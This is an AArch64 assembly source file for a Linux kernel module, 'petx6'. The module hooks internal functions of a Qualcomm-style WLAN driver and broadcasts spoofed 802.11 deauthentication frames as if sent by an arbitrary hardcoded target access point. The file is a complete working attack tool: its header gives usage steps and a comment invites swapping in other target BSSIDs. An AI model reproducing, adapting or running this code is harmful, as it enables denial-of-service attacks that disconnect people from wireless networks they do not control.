/*
 * petx6.S - Spoofed deauth for ARBITRARY AP (hardcoded target BSSID)
 *
 * Unlike petx5 which spoofs as the connected AP, petx6 spoofs as
 * ANY target AP by overwriting both bssId AND selfMacAddr in the
 * PE session with a hardcoded target BSSID.
 *
 * Usage: While connected to ANY AP (e.g. home), load this module
 * to send broadcast deauth as if from the target AP.
 *
 * Build: as -o petx6.o petx6.S && ld -r -o petx6.ko petx6.o
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "kfind"
    .fill 50, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=kfind"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0

.section .rodata, "a"
str_cds:        .asciz "cds_get_context"
str_pe_find:    .asciz "pe_find_session_by_session_id"
str_lim_deauth: .asciz "lim_send_deauth_mgmt_frame"

fmt_init:    .asciz "petx6: spoofed deauth for target AP\n"
fmt_sess:    .asciz "petx6: session=%px orig_bssid=%02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_spoof:   .asciz "petx6: spoofed to target=%02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_call:    .asciz "petx6: sending deauth...\n"
fmt_restored:.asciz "petx6: restored original MACs\n"
fmt_err:     .asciz "petx6: ERROR - no session or symbol\n"
fmt_done:    .asciz "petx6: done\n"

/* Broadcast DA */
.balign 8
bcast_mac:
    .byte 0xff,0xff,0xff,0xff,0xff,0xff
    .byte 0,0

/* ===== TARGET BSSID - CHANGE THIS FOR DIFFERENT TARGETS ===== */
.balign 8
target_bssid:
    .byte 0x8C,0xF0,0xDF,0x1F,0x4F,0xC7   /* Flymodem2631 */
    .byte 0,0

.equ SELFMAC_OFF, 0xC6
.equ BSSID_OFF, 0xC0

.section .init.text, "ax"
.globl init_module
.type init_module, %function
init_module:
    stp x29, x30, [sp, #-112]!
    mov x29, sp
    stp x19, x20, [sp, #16]
    stp x21, x22, [sp, #32]
    stp x23, x24, [sp, #48]
    stp x25, x26, [sp, #64]
    stp x27, x28, [sp, #80]
    /* sp+96..111 used for saving original bssId (6 bytes) */

    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    /* Resolve symbols */
    adrp x0, str_cds
    add x0, x0, :lo12:str_cds
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x19, x0                /* x19 = cds_get_context */

    adrp x0, str_pe_find
    add x0, x0, :lo12:str_pe_find
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x20, x0                /* x20 = pe_find_session_by_session_id */

    adrp x0, str_lim_deauth
    add x0, x0, :lo12:str_lim_deauth
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x21, x0                /* x21 = lim_send_deauth_mgmt_frame */

    /* Get mac_ctx (PE context = 0x35) */
    mov w0, #53
    blr x19
    cbz x0, .Lerr
    mov x22, x0                /* x22 = mac_ctx */

    /* Find PE session - try IDs 0-7 */
    mov w28, #0

.Lfind_session:
    cmp w28, #8
    b.ge .Lerr
    mov x0, x22
    mov w1, w28
    blr x20
    cbnz x0, .Lgot_session
    add w28, w28, #1
    b .Lfind_session

.Lgot_session:
    mov x23, x0                /* x23 = session */

    /* Print original bssId */
    add x8, x23, #BSSID_OFF
    adrp x0, fmt_sess
    add x0, x0, :lo12:fmt_sess
    mov x1, x23
    ldrb w2, [x8, #0]
    ldrb w3, [x8, #1]
    ldrb w4, [x8, #2]
    ldrb w5, [x8, #3]
    ldrb w6, [x8, #4]
    ldrb w7, [x8, #5]
    bl printk

    /* ===== Save original bssId (6 bytes at +0xC0) ===== */
    add x8, x23, #BSSID_OFF
    ldr w24, [x8]              /* x24 = first 4 bytes of bssId */
    ldrh w25, [x8, #4]        /* x25 = last 2 bytes of bssId */

    /* ===== Save original selfMacAddr (6 bytes at +0xC6) ===== */
    add x8, x23, #SELFMAC_OFF
    ldr w26, [x8]              /* x26 = first 4 bytes of selfMacAddr */
    ldrh w27, [x8, #4]        /* x27 = last 2 bytes of selfMacAddr */

    /* ===== Overwrite bssId with target BSSID ===== */
    adrp x9, target_bssid
    add x9, x9, :lo12:target_bssid
    ldr w10, [x9]              /* first 4 bytes of target */
    ldrh w11, [x9, #4]        /* last 2 bytes of target */

    add x8, x23, #BSSID_OFF
    str w10, [x8]
    strh w11, [x8, #4]

    /* ===== Overwrite selfMacAddr with target BSSID ===== */
    add x8, x23, #SELFMAC_OFF
    str w10, [x8]
    strh w11, [x8, #4]

    /* Print spoofed */
    add x8, x23, #BSSID_OFF
    adrp x0, fmt_spoof
    add x0, x0, :lo12:fmt_spoof
    ldrb w1, [x8, #0]
    ldrb w2, [x8, #1]
    ldrb w3, [x8, #2]
    ldrb w4, [x8, #3]
    ldrb w5, [x8, #4]
    ldrb w6, [x8, #5]
    bl printk

    /* ===== Call lim_send_deauth_mgmt_frame ===== */
    adrp x0, fmt_call
    add x0, x0, :lo12:fmt_call
    bl printk

    mov x0, x22                /* mac_ctx */
    mov w1, #7                 /* reason: Class 3 frame */
    adrp x2, bcast_mac
    add x2, x2, :lo12:bcast_mac  /* peer = broadcast */
    mov x3, x23                /* session */
    mov w4, #0                 /* waitForAck = false */
    blr x21                   /* lim_send_deauth_mgmt_frame */

    /* ===== Restore original bssId ===== */
    add x8, x23, #BSSID_OFF
    str w24, [x8]
    strh w25, [x8, #4]

    /* ===== Restore original selfMacAddr ===== */
    add x8, x23, #SELFMAC_OFF
    str w26, [x8]
    strh w27, [x8, #4]

    adrp x0, fmt_restored
    add x0, x0, :lo12:fmt_restored
    bl printk

    adrp x0, fmt_done
    add x0, x0, :lo12:fmt_done
    bl printk
    mov w0, #0
    b .Lret

.Lerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    bl printk
    mov w0, #-1

.Lret:
    ldp x27, x28, [sp, #80]
    ldp x25, x26, [sp, #64]
    ldp x23, x24, [sp, #48]
    ldp x21, x22, [sp, #32]
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #112
    ret

.section .exit.text, "ax"
.globl cleanup_module
.type cleanup_module, %function
cleanup_module:
    ret

.section .note.Linux, "a", @note
    .long 6
    .long 0
    .long 0x100
    .asciz "Linux"
    .balign 4

.section .plt, "ax"
    .balign 8
    .space 8

.section .init.plt, "ax"
    .balign 8
    .space 8

.section .text.ftrace_trampoline, "ax"
    .balign 8
    .space 8
